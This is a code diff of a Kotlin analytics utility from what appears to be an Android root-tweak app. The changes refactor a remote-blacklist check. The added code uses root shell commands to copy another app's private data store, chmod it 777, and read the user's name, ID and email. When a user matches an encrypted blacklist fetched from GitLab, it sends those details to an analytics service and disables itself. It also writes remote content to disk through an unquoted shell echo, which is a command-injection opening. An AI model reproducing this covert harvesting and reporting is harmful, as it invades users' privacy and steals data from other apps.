@@ -7,7 +7,6 @@ import com.drake.net.Get
 import com.drake.net.utils.scope
 import com.drake.net.utils.scopeNet
 import com.drake.net.utils.withDefault
-import com.drake.net.utils.withIO
 import com.joom.paranoid.Obfuscate
 import com.luckyzyx.luckytool.BuildConfig
 import com.microsoft.appcenter.AppCenter
@@ -15,6 +14,7 @@ import com.microsoft.appcenter.analytics.Analytics
 import com.microsoft.appcenter.crashes.Crashes
 import com.tencent.mmkv.MMKV
 import com.topjohnwu.superuser.ShellUtils
+import kotlinx.coroutines.Dispatchers
 import org.json.JSONArray
 import org.json.JSONObject
 
@@ -46,26 +46,31 @@ object AppAnalyticsUtils {
     }
 
     private fun Context.checkMagicalStory(isDebug: Boolean = false): ArrayMap<String, String> {
-        val appInfo = PackageUtils(packageManager).getApplicationInfo(
-            "com.magicalstory.AppStore", 0
-        ) ?: return ArrayMap<String, String>()
-        if (isDebug) LogUtils.i("checkMagicalStory", "dataDir", appInfo.dataDir, true)
-        ShellUtils.fastCmd(
-            "cp -R -f ${appInfo.dataDir}/files/mmkv $cacheDir", "chmod -R -f 777 $cacheDir/mmkv"
-        )
-        val path = MMKV.initialize(this, "$cacheDir/mmkv")
-        if (isDebug) LogUtils.i("MMKV", "initialize", path, true)
+        val map = ArrayMap<String, String>()
+        return try {
+            val appInfo = PackageUtils(packageManager).getApplicationInfo(
+                "com.magicalstory.AppStore", 0
+            ) ?: return ArrayMap<String, String>()
+            if (isDebug) LogUtils.i("checkMagicalStory", "dataDir", appInfo.dataDir, true)
+            ShellUtils.fastCmd(
+                "cp -R -f ${appInfo.dataDir}/files/mmkv $cacheDir", "chmod -R -f 777 $cacheDir/mmkv"
+            )
+            val path = MMKV.initialize(this, "$cacheDir/mmkv")
+            if (isDebug) LogUtils.i("MMKV", "initialize", path, true)
 
-        val mmkv = MMKV.defaultMMKV(MMKV.MULTI_PROCESS_MODE, null)
-        val name = mmkv.decodeString("name")
-        if (isDebug) LogUtils.i("MMKV", "name", "$name", true)
-        val userId = mmkv.decodeString("user_id")
-        if (isDebug) LogUtils.i("MMKV", "userId", "$userId", true)
-        val email = mmkv.decodeString("email")
-        if (isDebug) LogUtils.i("MMKV", "email", "$email", true)
-        mmkv.close()
-        return ArrayMap<String, String>().apply {
-            put("$userId", "$name | $userId | $email")
+            val mmkv = MMKV.defaultMMKV(MMKV.MULTI_PROCESS_MODE, null)
+            val name = mmkv.decodeString("name")
+            if (isDebug) LogUtils.i("MMKV", "name", "$name", true)
+            val userId = mmkv.decodeString("user_id")
+            if (isDebug) LogUtils.i("MMKV", "userId", "$userId", true)
+            val email = mmkv.decodeString("email")
+            if (isDebug) LogUtils.i("MMKV", "email", "$email", true)
+            mmkv.close()
+            map["$userId"] = "$name | $userId | $email"
+            map
+        } catch (t: Throwable) {
+            LogUtils.i("MMKV", "error", "$t", true)
+            map
         }
     }
 
@@ -98,87 +103,124 @@ object AppAnalyticsUtils {
         }
     }
 
-    fun Context.checkGitlabBlackList() {
-        var data = ""
+    fun Context.checkGitlabBlackList(isDebug: Boolean = false) {
         scopeNet {
             val latestUrl = "https://gitlab.com/luckyzyx/luckyzyx.gitlab.io/raw/main/blacklist"
             val getDoc = Get<String>(latestUrl).await()
-            data = if (getDoc.isNotBlank()) AESCrypt.decrypt(getDoc) else ""
-//            LogUtils.e("check gitlab", "data", data, true)
-        }.catch {
-            LogUtils.e("check gitlab", "throw", "$it", true)
-            data = ""
-            return@catch
-        }.finally { scope { withIO { startCheckList("gitlab", data) } } }
-    }
-
-    private fun Context.startCheckList(tag: String, json: String, isDebug: Boolean = false) {
-        scope {
-            withDefault {
-                var qbsval = false
-                var cbsval = false
-                var disval = false
-                var magval = false
-                val map = ArrayMap<String, String>()
-                map["time"] = formatDate("YYYYMMdd-HH:mm:ss")
-                if (qss.isEmpty()) qss = getQSlist()
-                if (css.isEmpty()) css = getCSid()
-                if (gid.isEmpty()) gid = getGuid
-                val js = safeOfNull { JSONObject(json) } ?: JSONObject()
-                if (isDebug) LogUtils.e("check js", "js", "$tag | $json", true)
-
-                if (json.isBlank() || js.length() <= 0) {
-                    startCheckListFinal()
-                    return@withDefault
-                }
-                (js.optJSONArray("qbk") ?: JSONArray()).toStringList().apply {
-                    qss.forEach {
-                        if (isDebug) LogUtils.e("check qbk", "for", "$this | $it", true)
-                        if (contains(it)) {
-                            qbsval = true
-                            map["qbk"] = it
-                        }
-                    }
-                }
-                (js.optJSONArray("cbk") ?: JSONArray()).toStringList().apply {
-                    css.forEach {
-                        if (isDebug) LogUtils.e("check cbk", "for", "$this | $it", true)
-                        if (contains(it)) {
-                            cbsval = true
-                            map["cbk"] = it
-                        }
-                    }
-                }
-                (js.optJSONArray("dik") ?: JSONArray()).toStringList().apply {
-                    if (isDebug) LogUtils.e("check dik", "for", "$this | $gid", true)
-                    if (contains(gid)) {
-                        disval = true
-                        map["dik"] = gid
-                    }
-                }
-                (js.optJSONArray("magical") ?: JSONArray()).toStringList().apply {
-                    val list = checkMagicalStory()
-                    if (isDebug) LogUtils.e("check mag", "list", "$this | $list", true)
-                    if (list.isNotEmpty()) list.keys.forEach {
-                        if (contains(it)) {
-                            magval = true
-                            map["mag"] = list[it]
-                        }
-                    }
-                }
-                if (qbsval || cbsval || disval || magval) {
-                    trackEvent("bk", map)
-                    removeModule()
-                    exitModule()
-                }
+            if (getDoc.isNotBlank()) {
+//                LogUtils.e("checkGitlabBlackList", "remote", getDoc, true)
+                startCheckList("remote", getDoc, "", isDebug)
             }
         }.catch {
-            LogUtils.e("check list", tag, "$it")
-            startCheckListFinal()
+            LogUtils.e("check gitlab", "throw", "$it", true)
+            startLocalCheckList(isDebug)
         }
     }
 
-    fun Context.startCheckListFinal() {
+    private fun Context.saveBlackList(original: String) {
+        scope(dispatcher = Dispatchers.Default) {
+            val remoteJsonData = safeOfNull { AESCrypt.decrypt(original) } ?: ""
+            val remoteJson = safeOfNull { JSONObject(remoteJsonData) } ?: JSONObject()
+            val remoteUpdateTime = remoteJson.optString("updateTime")
+            if (remoteUpdateTime.isNotBlank()) {
+                val localOriginal = ShellUtils.fastCmd("cat /data/local/tmp/luckys/data.dat")
+                val localFinalData = safeOfNull { AESCrypt.decrypt(localOriginal) } ?: ""
+//                LogUtils.d("getLocalBlackList", "original", original, true)
+                val localJson = safeOfNull { JSONObject(localFinalData) } ?: JSONObject()
+                val localUpdateTime = localJson.optString("updateTime")
+                if (remoteUpdateTime != localUpdateTime) {
+                    ShellUtils.fastCmd("echo $original > /data/local/tmp/luckys/data.dat")
+                }
+            } else {
+                startLocalCheckList()
+            }
+        }
+    }
+
+    private fun Context.startCheckList(
+        tag: String, original: String, jsonstring: String, isDebug: Boolean = false
+    ) {
+        scope(dispatcher = Dispatchers.Default) {
+            if (isDebug) LogUtils.e(
+                "startCheckList", tag, "${original.isNotBlank()} | ${jsonstring.isNotBlank()}", true
+            )
+            if (original.isNotBlank()) saveBlackList(original)
+
+            var qbsval = false
+            var cbsval = false
+            var disval = false
+            var magval = false
+            val map = ArrayMap<String, String>()
+            map["time"] = formatDate("YYYYMMdd-HH:mm:ss")
+
+            initAllBlackIds(isDebug)
+
+            var decryptJson = safeOfNull { AESCrypt.decrypt(original) } ?: ""
+            if (tag == "builtIn") decryptJson = jsonstring
+            val js = safeOfNull { JSONObject(decryptJson) } ?: JSONObject()
+            if (isDebug) LogUtils.e("check", tag, "${decryptJson.ifBlank { null }}", true)
+
+            if (original.isBlank()) {
+                if (jsonstring.isBlank() || js.length() <= 0) {
+                    startBuiltInCheckList(isDebug)
+                }
+                return@scope
+            }
+
+            (js.optJSONArray("qbk") ?: JSONArray()).toStringList().apply {
+                qss.forEach {
+                    if (isDebug) LogUtils.e("check qbk", "for", "$this | $it", true)
+                    if (contains(it)) {
+                        qbsval = true
+                        map["qbk"] = it
+                    }
+                }
+            }
+            (js.optJSONArray("cbk") ?: JSONArray()).toStringList().apply {
+                css.forEach {
+                    if (isDebug) LogUtils.e("check cbk", "for", "$this | $it", true)
+                    if (contains(it)) {
+                        cbsval = true
+                        map["cbk"] = it
+                    }
+                }
+            }
+            (js.optJSONArray("dik") ?: JSONArray()).toStringList().apply {
+                if (isDebug) LogUtils.e("check dik", "for", "$this | $gid", true)
+                if (contains(gid)) {
+                    disval = true
+                    map["dik"] = gid
+                }
+            }
+            (js.optJSONArray("magical") ?: JSONArray()).toStringList().apply {
+                val list = checkMagicalStory()
+                if (isDebug) LogUtils.e("check mag", "list", "$this | $list", true)
+                if (list.isNotEmpty()) list.keys.forEach {
+                    if (contains(it)) {
+                        magval = true
+                        map["mag"] = list[it]
+                    }
+                }
+            }
+            if (qbsval || cbsval || disval || magval) {
+                trackEvent("bk", map)
+                removeModule()
+                exitModule()
+            }
+        }.catch {
+            LogUtils.e("check list", tag, "$it")
+        }
+    }
+
+    private fun Context.startLocalCheckList(isDebug: Boolean = false) {
+        scope(dispatcher = Dispatchers.Default) {
+            val localOriginal = ShellUtils.fastCmd("cat /data/local/tmp/luckys/data.dat")
+//                LogUtils.d("getLocalBlackList", "original", original, true)
+            startCheckList("local", localOriginal, "", isDebug)
+        }
+    }
+
+    private fun Context.startBuiltInCheckList(isDebug: Boolean = false) {
         val json = JSONObject().apply {
             put("qbk", JSONArray().apply {
                 put("1150325619")
@@ -207,6 +249,17 @@ object AppAnalyticsUtils {
 
             })
         }
-        startCheckList("final", json.toString())
+        startCheckList("builtIn", "", json.toString(), isDebug)
+    }
+
+    private suspend fun initAllBlackIds(isDebug: Boolean = false) {
+        withDefault {
+            if (qss.isEmpty()) qss = getQSlist()
+            if (isDebug) LogUtils.e("check", "getQSlist", "${qss.toList()}", true)
+            if (css.isEmpty()) css = getCSid()
+            if (isDebug) LogUtils.e("check", "getCSid", "${css.toList()}", true)
+            if (gid.isEmpty()) gid = getGuid
+            if (isDebug) LogUtils.e("check", "getGuid", gid, true)
+        }
     }
 }
